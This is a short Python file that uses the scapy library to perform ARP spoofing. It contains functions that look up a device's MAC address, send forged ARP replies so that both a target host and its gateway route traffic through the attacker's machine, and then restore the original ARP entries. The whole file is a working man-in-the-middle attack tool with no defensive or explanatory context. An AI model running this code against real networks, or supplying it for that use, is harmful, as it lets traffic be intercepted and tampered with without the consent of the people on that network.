import scapy.all as scapy

def get_device_info(ip):
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req = scapy.ARP(pdst=ip)
    ans = scapy.srp(broadcast/arp_req, timeout=2, verbose=False)[0]
    return (ans[0][1].hwsrc, "Known") if ans else (None, None)

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    # Tell target we are the router
    t_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Tell router we are the target
    g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    scapy.sendp(t_pkt, verbose=False)
    scapy.sendp(g_pkt, verbose=False)

def restore(dest_ip, src_ip):
    d_mac, _ = get_device_info(dest_ip)
    s_mac, _ = get_device_info(src_ip)
    if d_mac and s_mac:
        pkt = scapy.Ether(dst=d_mac)/scapy.ARP(op=2, pdst=dest_ip, hwdst=d_mac, psrc=src_ip, hwsrc=s_mac)
        scapy.sendp(pkt, count=5, verbose=False)
